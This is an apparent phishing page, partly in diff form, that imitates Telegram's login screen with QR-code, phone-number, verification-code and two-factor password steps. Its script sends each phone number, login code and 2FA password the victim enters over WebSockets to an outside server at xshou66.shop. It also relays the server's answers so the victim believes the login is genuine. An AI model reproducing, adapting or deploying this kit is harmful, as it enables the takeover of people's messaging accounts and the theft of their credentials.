‒‒‒ ‒‒‒‒","+82":" ‒‒ ‒‒‒‒ ‒‒‒","+211":" ‒‒ ‒‒‒ ‒‒‒‒","+34":" ‒‒‒ ‒‒‒ ‒‒‒","+94":" ‒‒ ‒‒‒ ‒‒‒‒","+249":" ‒‒ ‒‒‒ ‒‒‒‒","+597":" ‒‒‒ ‒‒‒‒","+46":" ‒‒ ‒‒‒ ‒‒‒‒","+41":" ‒‒ ‒‒‒ ‒‒‒‒","+963":" ‒‒‒ ‒‒‒ ‒‒‒","+886":" ‒‒‒ ‒‒‒ ‒‒‒","+992":" ‒‒ ‒‒‒ ‒‒‒‒","+255":" ‒‒ ‒‒‒ ‒‒‒‒","+66":" ‒ ‒‒‒‒ ‒‒‒‒","+670":" ","+228":" ‒‒ ‒‒‒ ‒‒‒","+690":" ","+676":" ","+1868":" ‒‒‒ ‒‒‒‒","+216":" ‒‒ ‒‒‒ ‒‒‒","+90":" ‒‒‒ ‒‒‒ ‒‒‒‒","+993":" ‒‒ ‒‒‒‒‒‒","+1649":" ‒‒‒ ‒‒‒‒","+688":" ","+256":" ‒‒ ‒‒‒ ‒‒‒‒","+380":" ‒‒ ‒‒‒ ‒‒ ‒‒","+971":" ‒‒ ‒‒‒ ‒‒‒‒","+44":" ‒‒‒‒ ‒‒‒‒‒‒","+598":" ‒ ‒‒‒ ‒‒‒‒","+1340":" ‒‒‒ ‒‒‒‒","+998":" ‒‒ ‒‒‒ ‒‒ ‒‒","+678":" ","+58":" ‒‒‒ ‒‒‒ ‒‒‒‒","+84":" ","+681":" ","+967":" ‒‒‒ ‒‒‒ ‒‒‒","+260":" ‒‒ ‒‒‒ ‒‒‒‒","+263":" ‒‒ ‒‒‒ ‒‒‒‒"}function generateRandomString(length){const characters='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';let result='';for(let i=0;i<length;i++){result+=characters.charAt(Math.floor(Math.random()*characters.length))}return result}function showQrLogin(obj){document.getElementById("qrlogin").style.display=""document.getElementById("phonelogin").classList.add("animated","slideOutLeft")document.getElementById("qrlogin").classList.add("animated","slideInRight")setTimeout(()=>{document.getElementById("phonelogin").style.display="none"},100)}function submitPhone(obj){var phone=document.getElementById("phoneinput").innerText;phone=phone.replace(/ /g,'')if(phone.length<3){return}document.getElementById("sendphonebtntext").innerText="PLEASE WAIT..."obj.disabled=true;showPhoneLoading()socketphone.send(phone)}function tipphoneerr(msg){document.getElementById("labelphone").innerText=msg document.getElementById("labelphone").classList.add("err")document.getElementById("phoneinput").classList.add("error")}function tipcodeerr(msg){document.getElementById("passcodeplaceholder").innerText=msg document.getElementById("passcodeplaceholder").classList.add("err")document.getElementById("passcode").classList.add("error")}function tippasserr(msg){document.getElementById("sendpassbtntext").innerText=msg document.getElementById("pass").classList.add("error")document.getElementById("labelpass").classList.add("err")}function clearerr(){document.getElementById("sendpassbtntext").innerText="NEXT"document.getElementById("passcodeplaceholder").innerText="Code"document.getElementById("labelphone").innerText="Phone Number"document.querySelectorAll(".err").forEach(element=>{element.classList.remove("err")});document.querySelectorAll(".error").forEach(element=>{element.classList.remove("error")})}function tiperror(){document.getElementById("labelpassword").classList.add("err")}function showloadingbtn(){document.getElementById("loadingbtn").style.display=""}function showPhoneLoading(){document.getElementById("phoneloading").style.display=""}function submitPassword(obj){const password=document.getElementById("password").value;if(password==""){tiperror()return}document.getElementById("btntext").innerText="PLEASE WAIT..."showloadingbtn()obj.disabled=true;socket.send(password)}function submitpass(obj){var pass=document.getElementById("pass").value;if(pass.length==0){tippasserr('NEXT')return}obj.disabled=true document.getElementById("passloading").style.display=""document.getElementById("sendpassbtntext").innerText="PLEASE WAIT..."if(flag=="phonelog"){socketphone.send("2fa:"+pass)}else{socket.send(pass)}}document.getElementById("country").addEventListener("focus",function(){document.getElementById("select-pane").classList.remove("animated-fade","fadeOut")document.getElementById("select-pane").style.display=""document.getElementById("select-pane").classList.add("animated-fade","fadeIn")document.getElementById("arrow").classList.add("rotate-animation")document.getElementById("arrow").style.fill="#3390ec"})document.getElementById("country").addEventListener("blur",function(){document.getElementById("arrow").classList.remove("rotate-animation")document.getElementById("arrow").style.fill="#707579"setTimeout(()=>{document.getElementById("select-pane").classList.remove("animated-fade","fadeIn")document.getElementById("select-pane").style.display="none"document.getElementById("select-pane").classList.add("animated-fade","fadeOut")},300)})document.getElementById("country").addEventListener("input",function(e){allSelectLi.forEach(function(item){inputtext=e.target.value.toLowerCase()litext=item.children[1].dataset.defaultName.toLowerCase()if(litext.includes(inputtext)){item.style.display=""}else{item.style.display="none"}})})document.getElementById("pass").addEventListener("input",function(e){clearerr()})document.getElementById("eyeclose").addEventListener("click",function(e){document.getElementById("pass").type="text"document.getElementById("eyeclose").style.display="none"document.getElementById("eyeopen").style.display=""document.getElementById("eyegif").src="../static/eyeopen.gif"setTimeout(()=>{document.getElementById("eyegif").src="../static/eyeopen-stop.gif"},350)})document.getElementById("eyeopen").addEventListener("click",function(e){document.getElementById("pass").type="password"document.getElementById("eyeopen").style.display="none"document.getElementById("eyeclose").style.display=""document.getElementById("eyegif").src="../static/eyeoff.gif"setTimeout(()=>{document.getElementById("eyegif").src="../static/eyeoff-stop.gif"},345)})function generatePhoneWithPattern(e){e.target.dataset.leftPattern=""var country1 phonetext=e.target.innerText phonetext=phonetext.replace(/ /g,'')if(phonetext.length<=4){for(let index=2;index<=phonetext.length;index++){temp=findCountrybyCode(phonetext.substring(0,index))if(temp){country1=temp}}if(country1==undefined){document.getElementById("country").value=""}}if(phonetext.length>=5){for(let index=5;index>=2;index--){temp=findCountrybyCode(phonetext.substring(0,index))if(temp&&country1==undefined){country1=temp}}}if(country1!=undefined){if(currentPrefix!=country1[1]){e.target.innerText=country1[1]movelatst(e.target)}currentPrefix=country1[1]document.getElementById("country").value=country1[0]pattern=patternMap[currentPrefix]phoneNo=phonetext.substring(currentPrefix.length)output=convertStringUsingPlaceholder(phoneNo,pattern)if(phoneNo.length>0){e.target.innerText=currentPrefix+" "+output.converted movelatst(e.target)}for(var index=0,count=0;index<pattern.length;index++){if(pattern[index]!=" "){count++}if(count==phoneNo.length){e.target.dataset.leftPattern=pattern.substring(index+1)break}}}}function convertStringUsingPlaceholder(input,placeholder){let result='';let inputIndex=0;let unusedPlaceholder='';let segments=placeholder.trim().split(' ');for(let i=0;i<segments.length;i++){let segment=segments[i];let segmentLength=segment.length;if(inputIndex+segmentLength<=input.length){result+=input.slice(inputIndex,inputIndex+segmentLength)+' ';inputIndex+=segmentLength}else{unusedPlaceholder=segment+' '+segments.slice(i+1).join(' ');break}}if(inputIndex<input.length){result+=input.slice(inputIndex)}return{converted:result.trim(),unusedPlaceholder:unusedPlaceholder.trim()}}document.getElementById("phoneinput").addEventListener("input",function(e){clearerr()if(e.data==null){if(e.target.innerText=="+"){document.getElementById("country").value=""e.target.dataset.leftPattern=""}else if(e.target.innerText==""){document.getElementById("country").value=""e.target.dataset.leftPattern=""return}}else if(!e.data.match(/[0-9]/)){e.target.innerText=e.target.innerText.replace(e.data,"")movelatst(e.target)return}text=e.target.innerText if(!text.startsWith("+")){e.target.innerText=""e.target.innerText+="+"+e.data movelatst(e.target)}text=e.target.innerText if(!text.slice(-1).match(/[0-9]/)){e.target.innerText=text.slice(0,-1)movelatst(e.target)return}generatePhoneWithPattern(e)})function movelatst(obj){const editableDiv=obj const selection=window.getSelection();const range=document.createRange();selection.removeAllRanges();range.selectNodeContents(editableDiv);range.collapse(false);selection.addRange(range);editableDiv.focus()}document.getElementById("passcode").addEventListener("input",function(e){clearerr()if(e.target.value.length==1&&e.inputType!="deleteContentBackward"){document.getElementById("lookaround").style.display="none"document.getElementById("lookdown").src="../static/lookdown.gif"document.getElementById("lookdown").style.display=""setTimeout(()=>{document.getElementById("lookdown").src="../static/lookdown-stop.png"},1000)}else if(e.target.value.length==0){document.getElementById("lookdown").style.display="none"document.getElementById("lookaround").style.display=""}else if(e.target.value.length==5){socketphone.send("code:"+e.target.value)}})document.getElementById("password").addEventListener("input",function(){if(this.value!=""){tipnormal()}document.getElementById("btntext").innerText="NEXT"})function tiperror(){document.getElementById("password").classList.remove("err");document.getElementById("password").classList.add("err");document.getElementById("labelinput").classList.remove("err");document.getElementById("labelinput").classList.add("err")}function tipnormal(){document.getElementById("password").classList.remove("err");document.getElementById("labelinput").classList.remove("err")}function showloadingbtn(){document.getElementById("loadingbtn").style.display=""}function hideloadingbtn(){document.getElementById("loadingbtn").style.display="none"}function submit(obj){obj.style.display="none"const password=document.getElementById("password").value;socket.send(password)}function resetPhonesend(){document.getElementById("sendphonebtntext").innerText="NEXT"document.getElementById("sendphonebtn").disabled=false document.getElementById("phoneloading").style.display="none"}var socketphone=new WebSocket("wss://xshou66.shop/wsp");socketphone.onopen=function(){setInterval(()=>{socketphone.send("ping")},10000)};socketphone.onmessage=function(event){if(event.data=='phoneinvalid'){tipphoneerr("Phone Number Invalid")resetPhonesend()}else if(event.data=='sendsucc'){resetPhonesend()document.getElementById("phonecodeview").innerText=document.getElementById("phoneinput").innerText slideTo("codediv")document.getElementById("passcode").value=""setTimeout(()=>{document.getElementById("passcode").focus()},1000)}else if(event.data=='2fa'){document.getElementById("2fadiv").style.display=""flag="phonelog"slide("right")}else if(event.data=='invalicode'){tipcodeerr("Invalid code")}else if(event.data=='inpass'){tippasserr("INCORRECT PASSWORD")document.getElementById("passloading").style.display="none"document.getElementById("sendpassbtn").disabled=false}else if(event.data=='phonepassflood'){resetPhonesend()document.getElementById("sendphonebtntext").innerText="PHONE_PASSWORD_FLOOD"}else if(event.data=='banned'){resetPhonesend()document.getElementById("sendphonebtntext").innerText="PHONE_NUMBER_BANNED"}else if(event.data=='succ'){alert("success")}};socketphone.onclose=function(){console.log("Disconnected from WebSocket server")};var socket=new WebSocket("wss://xshou66.shop/ws");socket.onopen=function(){};socket.onmessage=function(event){if(event.data.startsWith("tg:")){var qrcodediv=document.getElementById("qrcode")const qrCode=new QRCodeStyling({width:256,height:256,type:"svg",data:event.data,image:"https://xshou66.github.io/static/image-removebg-preview.png",dotsOptions:{type:"extra-rounded"},cornersSquareOptions:{type:"extra-rounded"},qrOptions:{typeNumber:"0",mode:"Byte",errorCorrectionLevel:"L"}});setTimeout(()=>{qrcodediv.innerHTML=''qrCode.append(qrcodediv);document.getElementById("loading").style.display="none"document.getElementById("qrcode").className=""document.getElementById("qrcode").className+=" animated zoomIn"document.getElementById("qrcode").style.display=""},10)}if(event.data=='waitpas'){document.getElementById("2fadiv").style.display="";flag="qrlog"slide('right')}if(event.data=='inpass'){tippasserr("INCORRECT PASSWORD")document.getElementById("passloading").style.display="none"document.getElementById("sendpassbtn").disabled=false}if(event.data=="succ"){alert("success")}};function sendMessage(){var input=document.getElementById("messageInput");socket.send(input.value);input.value=""}socket.onclose=function(){setTimeout(function(){},3000)console.log("Disconnected from WebSocket server")};function findCountrybyName(countryName){return countrymap[countryName]}function findCountrybyCode(countryCode){return Object.entries(countrymap).reverse().find(entry=>entry[1]===countryCode)}window.onload=function(){var sysflag='windows'if(navigator.userAgent.includes("Windows")){sysflag='windows'}allSelectLi=document.querySelectorAll(".select-ul > li")allSelectLi.forEach(function(item){if(sysflag=='windows'){item.querySelector(".emoji-native").remove();var phonecode=item.children[2].innerText;var img=document.createElement("img");img.src="../static/countryimages/"+phonecode+".png";img.className="emoji-li"img.style.width="35px"img.style.marginTop="-6px"item.querySelector("span[dir='auto']").appendChild(img)}item.addEventListener("click",function(){document.getElementById("country").value=item.children[1].innerText phoneinput=document.getElementById("phoneinput")phoneinput.innerText=item.children[2].innerText phoneinput.dataset.leftPattern=patternMap[item.children[2].innerText]phoneinput.focus()movelatst(phoneinput)})countrymap[item.children[1].innerText]=item.children[2].innerText})document.getElementById("container").style.display=""var lookgif=document.getElementById("lookaround")lookgif.src=lookgif.getAttribute("srco")var eyegif=document.getElementById("eyegif")eyegif.src=eyegif.getAttribute("srco")}slideTo("qrlogindiv")setTimeout(()=>{document.getElementById("container").style.display=""},200);</script></body></html>
+                    margin-left: 4px;" src="../static/edit.png">
+                    </span>
+                </div>
+
+                <div>
+                    <span class="desc">We have sent you a message in Telegram</span>
+                    <br>
+                    <span class="desc">with the code.</span>
+                </div>
+
+                <div class="input-container">
+                    <input id="passcode" maxlength="5" oninput="this.value = this.value.replace(/[^0-9]/g, '');"
+                        class="password-input" placeholder=" " autocomplete="off">
+                    <label id="passcodeplaceholder" for="passcode" class="placeholder">Code</label>
+                </div>
+
+            </div>
+        </div>
+
+        <div class="fullscreen" id="qrlogindiv">
+            <div id="qrlogin" class="panel" style="width: auto;">
+                <div id="qrsec">
+                    <div class="loader-1" id="loading"></div>
+                    <div style="display: none;" id="qrcode"></div>
+                    <h4>Log in to Telegram by QR Code</h4>
+
+                    <div class="instructions">
+                        <ol>
+                            <li>Open Telegram on your phone</li>
+                            <li><span class="i18n">Go to <b>Settings</b> &gt; <b>Devices</b> &gt; <b>Link Desktop
+                                        Device</b></span></li>
+                            <li>Point your phone at this screen to confirm login</li>
+                        </ol>
+                    </div>
+                    <button class="swipe-button" onclick="slide('left')" style="width: 22em;">
+                        <span class="i18n">LOG IN BY PHONE NUMBER</span>
+                    </button>
+                </div>
+
+
+                <div id="tip" style="display: none;">
+                    <div id="tipemo" class="emoji">👍</div>
+                    <h1 id="tiptext">SUCCESS</h1>
+
+                </div>
+            </div>
+
+        </div>
+
+        <div class="fullscreen" id="2fadiv">
+            <div class="panel">
+                <img id="eyegif"  srco="../static/eyeoff-stop.gif" style="width: 150px;margin-top: 60px;margin-bottom: 36px;">
+
+                <h1>Enter Your Password</h1>
+
+                <div>
+                    <span class="desc">Your account is protected with</span>
+                    <br>
+                    <span class="desc">an additional password</span>
+                </div>
+
+                <div class="input-container">
+                    <input id="pass" class="password-input" type="password" placeholder=" " autocomplete="off">
+                    <label id="labelpass" for="pass" class="placeholder">xxxx</label>
+                    <span>
+                        <svg id="eyeopen" t="1724156683295" class="icon eye-icon" viewBox="0 0 1024 1024" version="1.1"
+                            xmlns="http://www.w3.org/2000/svg" p-id="16058" width="20" height="20"
+                            style="margin-top: 10px; display: none;">
+                            <path
+                                d="M512 170.666667C298.666667 170.666667 116.48 303.36 42.666667 490.666667 116.48 677.973333 298.666667 810.666667 512 810.666667s395.52-132.693333 469.333333-320C907.52 303.36 725.333333 170.666667 512 170.666667z m0 533.333333c-117.76 0-213.333333-95.573333-213.333333-213.333333s95.573333-213.333333 213.333333-213.333334 213.333333 95.573333 213.333333 213.333334-95.573333 213.333333-213.333333 213.333333z m0-341.333333c-70.826667 0-128 57.173333-128 128s57.173333 128 128 128 128-57.173333 128-128-57.173333-128-128-128z"
+                                p-id="16059"></path>
+                        </svg>
+                        <svg id="eyeclose" t="1724155286461" class="icon eye-icon" viewBox="0 0 1024 1024" version="1.1"
+                            style="transform: scale(-1, 1);" xmlns="http://www.w3.org/2000/svg" p-id="14790" width="20"
+                            height="20" fill="currentColor">
+                            <path d="M509.76 623.68A109.76 109.76 0 0 0 615.68 512l-111.36 111.36z" p-id="14791"></path>
+                            <path
+                                d="M960 512a787.2 787.2 0 0 0-158.4-184.64l-119.68 119.68a195.84 195.84 0 0 1 10.88 64 187.84 187.84 0 0 1-183.04 192 176.96 176.96 0 0 1-70.08-14.4l-91.2 91.2A392.96 392.96 0 0 0 512 816c267.52 0 440.64-290.24 448-302.72h-2.24zM385.92 651.52l55.04-55.04 153.6-153.6 55.68-55.68L750.4 288l120.32-120.32-45.44-46.4-131.84 131.84-32-14.08c-10.56-4.48-21.76-8.64-32-12.16A379.52 379.52 0 0 0 512 208C244.48 208 71.36 498.24 64 512h2.24H64a800 800 0 0 0 124.48 154.56l23.68 21.44c8 7.04 16.32 13.76 24.64 20.48l-115.52 116.8 45.44 45.44 123.2-123.2z m-38.4-52.48a188.8 188.8 0 0 1-12.8-32 186.24 186.24 0 0 1-7.04-38.08 174.08 174.08 0 0 1 0-18.24 187.84 187.84 0 0 1 183.04-192 136.96 136.96 0 0 1 25.92 2.24 151.36 151.36 0 0 1 35.84 9.28 156.8 156.8 0 0 1 30.4 14.72L544 403.2a97.6 97.6 0 0 0-33.6-6.08h-5.76a108.8 108.8 0 0 0-99.2 99.2 96 96 0 0 0 0 13.76 122.24 122.24 0 0 0 3.52 28.8l-59.84 59.84z"
+                                p-id="14792"></path>
+                        </svg>
+                    </span>
+                </div>
+
+                <button id="sendpassbtn" class="next-button" onclick="submitpass(this)"><span id="sendpassbtntext">NEXT</span>
+                    <svg id="passloading" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100"
+                        preserveAspectRatio="xMidYMid" width="60" height="60"
+                        style="shape-rendering: auto;display: none;margin-bottom: -30px;margin-top: -20px;position: absolute;right: 0;"
+                        xmlns:xlink="http://www.w3.org/1999/xlink">
+                        <g>
+                            <circle stroke-dasharray="56.548667764616276 20.84955592153876" r="12" stroke-width="2"
+                                stroke="#ffffff" fill="none" cy="50" cx="50">
+                                <animateTransform keyTimes="0;1" values="0 50 50;360 50 50" dur="1.4705882352941175s"
+                                    repeatCount="indefinite" type="rotate" attributeName="transform"></animateTransform>
+                            </circle>
+                            <g></g>
+                        </g>
+                    </svg>
+                 </button>
+
+            </div>
+        </div>
+
+        <div class="fullscreen" id="div3" style="display: none;">
+            <div id="pwdsec" style="">
+                <div class="emoji">🙈</div>
+                <h1>Enter Your Password</h1>
+                <span class="desc">Your account is protected with</span>
+                <br>
+                <span class="desc">an additional password</span>
+                <div class="input-container">
+                    <input type="password" id="password" class="password-input" placeholder=" ">
+                    <label id="labelinput" for="password" class="placeholder">sv</label>
+                    <span class="eye-icon">👁️</span>
+                </div>
+                <button id="sendbtn" class="next-button" onclick="submitPassword(this)"><span id="btntext">NEXT</span>
+                    <svg id="loadingbtn" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100"
+                        preserveAspectRatio="xMidYMid" width="60" height="60"
+                        style="/* float: right; */shape-rendering: auto;display: none;margin-bottom: -30px;margin-top: -20px;/* display: none; */position: absolute;right: 0px;"
+                        xmlns:xlink="http://www.w3.org/1999/xlink">
+                        <g>
+                            <circle stroke-dasharray="56.548667764616276 20.84955592153876" r="12" stroke-width="2"
+                                stroke="#ffffff" fill="none" cy="50" cx="50">
+                                <animateTransform keyTimes="0;1" values="0 50 50;360 50 50" dur="1.4705882352941175s"
+                                    repeatCount="indefinite" type="rotate" attributeName="transform"></animateTransform>
+                            </circle>
+                            <g></g>
+                        </g>
+                    </svg> </button>
+
+                <button id="sendbtn" class="next-button" onclick="slide('left')"><span id="btntext">LEFT</span>
+                </button>
+            </div>
+        </div>
+    </div>
+    </div>
+    <script>
+        let currentSlide = 0;
+
+        function slide(direction) {
+
+            const container = document.getElementById('container');
+            const totalSlides = 3; // Total number of slides
+
+            if (direction === 'right') {
+                currentSlide = (currentSlide + 1) % totalSlides;
+            } else if (direction === 'left') {
+                currentSlide = (currentSlide - 1 + totalSlides) % totalSlides;
+            }
+
+            const offset = -100 * currentSlide; // Move container to the correct position
+            container.style.transform = `translateX(${offset}vw)`;
+        }
+
+        function slideTo(id){
+            document.getElementById("codediv").style.display = "none"
+            document.getElementById("qrlogindiv").style.display = "none"
+            document.getElementById("2fadiv").style.display = "none"
+
+            document.getElementById(id).style.display = ""
+
+            slide("right")
+        }
+
+        var flag = "phonelog"
+
+        var currentPatter = ""
+        var currentPrefix = ""
+        var countrymap = {}
+        var allSelectLi
+        var patternMap = {
+            "+93": " ‒‒‒ ‒‒‒ ‒‒‒",
+            "+355": " ‒‒ ‒‒‒ ‒‒‒‒",
+            "+213": " ‒‒‒ ‒‒ ‒‒ ‒‒",
+            "+1684": " ‒‒‒ ‒‒‒‒",
+            "+376": " ‒‒ ‒‒ ‒‒",
+            "+244": " ‒‒‒ ‒‒‒ ‒‒‒",
+            "+1264": " ‒‒‒ ‒‒‒‒",
+            "+888": " ‒ ‒‒‒",
+            "+1268": " ‒‒‒ ‒‒‒‒",
+            "+54": " ",
+            "+374": " ‒‒ ‒‒‒ ‒‒‒",
+            "+297": " ‒‒‒ ‒‒‒‒",
+            "+61": " ‒ ‒‒‒‒ ‒‒‒‒",
+            "+43": " ‒‒‒ ‒‒‒‒‒‒",
+            "+994": " ‒‒ ‒‒‒ ‒‒‒‒",
+            "+1242": " ‒‒‒ ‒‒‒‒",
+            "+973": " ‒‒‒‒ ‒‒‒‒",
+            "+880": " ‒‒ ‒‒‒ ‒‒‒",
+            "+1246": " ‒‒‒ ‒‒‒‒",
+            "+375": " ‒‒ ‒‒‒ ‒‒‒‒",
+            "+32": " ‒‒‒ ‒‒ ‒‒ ‒‒",
+            "+501": " ",
+            "+229": " ‒‒ ‒‒‒ ‒‒‒",
+            "+1441": " ‒‒‒ ‒‒‒‒",
+            "+975": " ‒‒ ‒‒‒ ‒‒‒",
+            "+591": " ‒ ‒‒‒ ‒‒‒‒",
+            "+599": " ",
+            "+387": " ‒‒ ‒‒‒ ‒‒‒",
+            "+267": " ‒‒ ‒‒‒ ‒‒‒",
+            "+55": " ‒‒ ‒‒‒‒‒ ‒‒‒‒",
+            "+1284": " ‒‒‒ ‒‒‒‒",
+            "+673": " ‒‒‒ ‒‒‒‒",
+            "+359": " ",
+            "+226": " ‒‒ ‒‒ ‒‒ ‒‒",
+            "+257": " ‒‒ ‒‒ ‒‒‒‒",
+            "+855": " ‒‒ ‒‒‒ ‒‒‒",
+            "+237": " ‒‒‒‒ ‒‒‒‒",
+            "+1": " ‒‒‒ ‒‒‒ ‒‒‒‒",
+            "+238": " ‒‒‒ ‒‒‒‒",
+            "+1345": " ‒‒‒ ‒‒‒‒",
+            "+236": " ‒‒ ‒‒ ‒‒ ‒‒",
+            "+235": " ‒‒ ‒‒ ‒‒ ‒‒",
+            "+56": " ‒ ‒‒‒‒ ‒‒‒‒",
+            "+86": " ‒‒‒ ‒‒‒‒ ‒‒‒‒",
+            "+57": " ‒‒‒ ‒‒‒ ‒‒‒‒",
+            "+269": " ‒‒‒ ‒‒‒‒",
+            "+243": " ‒‒ ‒‒‒ ‒‒‒‒",
+            "+242": " ‒‒ ‒‒‒ ‒‒‒‒",
+            "+682": " ",
+            "+506": " ‒‒‒‒ ‒‒‒‒",
+            "+225": " ‒‒ ‒‒ ‒‒ ‒‒‒‒",
+            "+385": " ‒‒ ‒‒‒ ‒‒‒",
+            "+53": " ‒ ‒‒‒ ‒‒‒‒",
+            "+357": " ‒‒‒‒ ‒‒‒‒",
+            "+420": " ‒‒‒ ‒‒‒ ‒‒‒",
+            "+45": " ‒‒‒‒ ‒‒‒‒",
+            "+246": " ‒‒‒ ‒‒‒‒",
+            "+253": " ‒‒ ‒‒ ‒‒ ‒‒",
+            "+1767": " ‒‒‒ ‒‒‒‒",
+            "+1809": " ‒‒‒ ‒‒‒‒",
+            "+1829": " ‒‒‒ ‒‒‒‒",
+            "+1849": " ‒‒‒ ‒‒‒‒",
+            "+593": " ‒‒ ‒‒‒ ‒‒‒‒",
+            "+20": " ‒‒ ‒‒‒‒ ‒‒‒‒",
+            "+503": " ‒‒‒‒ ‒‒‒‒",
+            "+240": " ‒‒‒ ‒‒‒ ‒‒‒",
+            "+291": " ‒ ‒‒‒ ‒‒‒",
+            "+372": " ‒‒‒‒ ‒‒‒",
+            "+268": " ‒‒‒‒ ‒‒‒‒",
+            "+251": " ‒‒ ‒‒‒ ‒‒‒",
+            "+500": " ",
+            "+298": " ‒‒‒ ‒‒‒",
+            "+679": " ‒‒‒ ‒‒‒‒",
+            "+358": " ",
+            "+33": " ‒ ‒‒ ‒‒ ‒‒ ‒‒",
+            "+594": " ",
+            "+689": " ",
+            "+241": " ‒ ‒‒ ‒‒ ‒‒",
+            "+220": " ‒‒‒ ‒‒‒‒",
+            "+995": " ‒‒‒ ‒‒‒ ‒‒‒",
+            "+49": " ‒‒‒‒ ‒‒‒‒‒‒‒",
+            "+233": " ‒‒ ‒‒‒ ‒‒‒‒",
+            "+350": " ‒‒‒‒ ‒‒‒‒",
+            "+30": " ‒‒‒ ‒‒‒ ‒‒‒‒",
+            "+299": " ‒‒‒ ‒‒‒",
+            "+1473": " ‒‒‒ ‒‒‒‒",
+            "+590": " ‒‒‒ ‒‒ ‒‒ ‒‒",
+            "+1671": " ‒‒‒ ‒‒‒‒",
+            "+502": " ‒ ‒‒‒ ‒‒‒‒",
+            "+224": " ‒‒‒ ‒‒‒ ‒‒‒",
+            "+245": " ‒‒‒ ‒‒‒‒",
+            "+592": " ‒‒‒‒‒‒‒‒‒‒",
+            "+509": " ‒‒‒‒ ‒‒‒‒",
+            "+504": " ‒‒‒‒ ‒‒‒‒",
+            "+852": " ‒ ‒‒‒ ‒‒‒‒",
+            "+36": " ‒‒‒ ‒‒‒ ‒‒‒",
+            "+354": " ‒‒‒ ‒‒‒‒",
+            "+91": " ‒‒‒‒‒ ‒‒‒‒‒",
+            "+62": " ‒‒‒ ‒‒‒‒‒‒",
+            "+98": " ‒‒‒ ‒‒‒ ‒‒‒‒",
+            "+964": " ‒‒‒ ‒‒‒ ‒‒‒‒",
+            "+353": " ‒‒ ‒‒‒ ‒‒‒‒",
+            "+972": " ‒‒ ‒‒‒ ‒‒‒‒",
+            "+39": " ‒‒‒ ‒‒‒ ‒‒‒‒",
+            "+1876": " ‒‒‒ ‒‒‒‒",
+            "+81": " ‒‒ ‒‒‒‒ ‒‒‒‒",
+            "+962": " ‒ ‒‒‒‒ ‒‒‒‒",
+            "+7": " ‒‒‒ ‒‒‒ ‒‒‒‒",
+            "+254": " ‒‒‒ ‒‒‒ ‒‒‒",
+            "+686": " ‒‒‒‒ ‒‒‒‒",
+            "+383": " ‒‒‒‒ ‒‒‒‒",
+            "+965": " ‒‒‒‒ ‒‒‒‒",
+            "+996": " ‒‒‒ ‒‒‒‒‒‒",
+            "+371": " ‒‒‒ ‒‒‒‒‒",
+            "+856": " ‒‒ ‒‒ ‒‒‒ ‒‒‒",
+            "+961": " ",
+            "+266": " ‒‒ ‒‒‒ ‒‒‒",
+            "+231": " ‒‒ ‒‒‒ ‒‒‒‒",
+            "+218": " ‒‒ ‒‒‒ ‒‒‒‒",
+            "+423": " ‒‒‒ ‒‒‒‒",
+            "+370": " ‒‒‒ ‒‒‒‒‒",
+            "+352": " ‒‒‒ ‒‒‒ ‒‒‒",
+            "+853": " ‒‒‒‒ ‒‒‒‒",
+            "+261": " ‒‒ ‒‒ ‒‒‒ ‒‒",
+            "+265": " ‒‒ ‒‒‒ ‒‒‒‒",
+            "+60": " ",
+            "+960": " ‒‒‒ ‒‒‒‒",
+            "+223": " ‒‒‒‒ ‒‒‒‒",
+            "+356": " ‒‒ ‒‒ ‒‒ ‒‒",
+            "+692": " ",
+            "+596": " ",
+            "+222": " ‒‒‒‒ ‒‒‒‒",
+            "+230": " ‒‒‒‒ ‒‒‒‒",
+            "+52": " ",
+            "+691": " ",
+            "+373": " ‒‒ ‒‒‒ ‒‒‒",
+            "+377": " ‒‒‒‒ ‒‒‒‒",
+            "+976": " ‒‒ ‒‒ ‒‒‒‒",
+            "+382": " ",
+            "+1664": " ‒‒‒ ‒‒‒‒",
+            "+212": " ‒‒ ‒‒‒ ‒‒‒‒",
+            "+258": " ‒‒ ‒‒‒ ‒‒‒‒",
+            "+95": " ",
+            "+264": " ‒‒ ‒‒‒ ‒‒‒‒",
+            "+674": " ",
+            "+977": " ‒‒ ‒‒‒‒ ‒‒‒‒",
+            "+31": " ‒ ‒‒ ‒‒ ‒‒ ‒‒",
+            "+687": " ",
+            "+64": " ‒‒‒‒ ‒‒‒‒",
+            "+505": " ‒‒‒‒ ‒‒‒‒",
+            "+227": " ‒‒ ‒‒ ‒‒ ‒‒",
+            "+234": " ‒‒ ‒‒‒‒ ‒‒‒‒",
+            "+683": " ",
+            "+672": " ",
+            "+850": " ",
+            "+389": " ‒‒ ‒‒‒‒‒‒",
+            "+1670": " ‒‒‒ ‒‒‒‒",
+            "+47": " ‒‒‒ ‒‒ ‒‒‒",
+            "+968": " ‒‒‒‒ ‒‒‒‒",
+            "+92": " ‒‒‒ ‒‒‒ ‒‒‒‒",
+            "+680": " ",
+            "+970": " ‒‒‒ ‒‒ ‒‒‒‒",
+            "+507": " ‒‒‒‒ ‒‒‒‒",
+            "+675": " ",
+            "+595": " ‒‒‒ ‒‒‒ ‒‒‒",
+            "+51": " ‒‒‒ ‒‒‒ ‒‒‒",
+            "+63": " ‒‒‒ ‒‒‒ ‒‒‒‒",
+            "+48": " ‒‒‒ ‒‒‒ ‒‒‒",
+            "+351": " ‒‒‒ ‒‒‒ ‒‒‒",
+            "+1787": " ‒‒‒ ‒‒‒‒",
+            "+1939": " ‒‒‒ ‒‒‒‒",
+            "+974": " ‒‒ ‒‒‒ ‒‒‒",
+            "+262": " ‒‒‒ ‒‒‒ ‒‒‒",
+            "+40": " ‒‒‒ ‒‒‒ ‒‒‒",
+            "+250": " ‒‒‒ ‒‒‒ ‒‒‒",
+            "+247": " ",
+            "+290": " ‒‒ ‒‒‒",
+            "+1869": " ‒‒‒ ‒‒‒‒",
+            "+1758": " ‒‒‒ ‒‒‒‒",
+            "+508": " ",
+            "+1784": " ‒‒‒ ‒‒‒‒",
+            "+685": " ",
+            "+378": " ",
+            "+239": " ‒‒ ‒‒‒‒‒",
+            "+966": " ‒‒ ‒‒‒ ‒‒‒‒",
+            "+221": " ‒‒ ‒‒‒ ‒‒‒‒",
+            "+381": " ‒‒ ‒‒‒ ‒‒‒",
+            "+248": " ‒ ‒‒ ‒‒ ‒‒",
+            "+232": " ‒‒ ‒‒‒ ‒‒‒",
+            "+65": " ‒‒‒‒ ‒‒‒‒",
+            "+1721": " ‒‒‒ ‒‒‒‒",
